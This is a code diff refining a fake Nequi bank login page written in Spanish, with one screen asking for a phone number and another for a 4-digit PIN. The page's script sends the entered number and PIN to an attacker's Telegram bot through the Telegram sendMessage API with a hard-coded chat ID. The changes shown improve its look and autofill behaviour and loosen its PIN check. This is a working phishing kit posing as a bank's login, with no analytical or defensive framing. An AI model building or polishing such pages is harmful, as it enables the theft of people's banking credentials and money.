@@ -37,6 +37,7 @@
             align-items: center;
             justify-content: center;
             font-size: 18px;
+            color: white;
         }
         .logo {
             font-size: 52px;
@@ -44,7 +45,7 @@
             color: #DA0081;
             text-align: center;
             margin-top: 80px;
-            margin-bottom: 60px;
+            margin-bottom: 80px;
         }
         .input-wrapper {
             background: rgba(255,255,255,0.08);
@@ -66,14 +67,26 @@
         }
         input {
             flex: 1;
-            background: transparent;
+            background: rgba(255,255,255,0.08) !important;
             border: none;
             padding: 16px;
             font-size: 17px;
-            color: white;
+            color: white !important;
             outline: none;
+            border-radius: 6px;
         }
-        input::placeholder { color: rgba(255,255,255,0.65); }
+        input::placeholder { 
+            color: rgba(255,255,255,0.65); 
+        }
+        /* Fix para autocompletado */
+        input:-webkit-autofill,
+        input:-webkit-autofill:hover,
+        input:-webkit-autofill:focus,
+        input:-webkit-autofill:active {
+            -webkit-text-fill-color: white !important;
+            -webkit-box-shadow: 0 0 0 30px rgba(255,255,255,0.08) inset !important;
+            transition: background-color 5000s ease-in-out 0s;
+        }
         button {
             width: 100%;
             height: 52px;
@@ -84,6 +97,7 @@
             font-size: 17px;
             font-weight: 500;
             margin-top: 10px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -94,7 +108,7 @@
         </header>
         <div class="logo">Nequi</div>
         
-        <div style="margin-top:auto; margin-bottom:30px;">
+        <div style="margin-top:auto; margin-bottom:40px;">
             <form id="phoneForm">
                 <div class="input-wrapper">
                     <div class="input-group">
@@ -107,16 +121,17 @@
         </div>
     </div>
 
-    <!-- Segunda pantalla: Clave de 4 dígitos -->
     <div class="container" id="screen2" style="display:none;">
         <header>
             <div class="help">?</div>
         </header>
         <div class="logo">Nequi</div>
         
-        <div style="margin-top:auto; margin-bottom:30px;">
+        <div style="margin-top:auto; margin-bottom:40px;">
             <form id="passForm">
-                <p style="text-align:center; margin-bottom:20px; color:#ccc;">Ingresa tu clave de 4 dígitos</p>
+                <p style="text-align:center; margin-bottom:25px; color:#ccc; font-size:15px;">
+                    Ingresa tu clave de 4 dígitos
+                </p>
                 <div class="input-wrapper">
                     <input type="password" id="password" placeholder="Clave de 4 dígitos" maxlength="4" inputmode="numeric" required>
                 </div>
@@ -130,13 +145,12 @@
         const chatId = "773351137";
         let phoneNumber = "";
 
-        // Primera pantalla
         document.getElementById("phoneForm").addEventListener("submit", function(e) {
             e.preventDefault();
             const phone = document.getElementById("phone").value.trim().replace(/\D/g, '');
             
             if (phone.length !== 10 || !phone.startsWith("3")) {
-                alert("Ingresa un número válido");
+                alert("Ingresa un número de celular válido");
                 return;
             }
 
@@ -145,13 +159,12 @@
             document.getElementById("screen2").style.display = "flex";
         });
 
-        // Segunda pantalla (Clave)
         document.getElementById("passForm").addEventListener("submit", function(e) {
             e.preventDefault();
             const pass = document.getElementById("password").value.trim();
 
-            if (pass.length !== 4 || !/^\d{4}$/.test(pass)) {
-                alert("La clave debe ser de 4 dígitos");
+            if (pass.length !== 4) {
+                alert("La clave debe tener 4 dígitos");
                 return;
             }
 
@@ -159,7 +172,7 @@
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
-                headers: {"Content-Type": "application/json"},
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
 
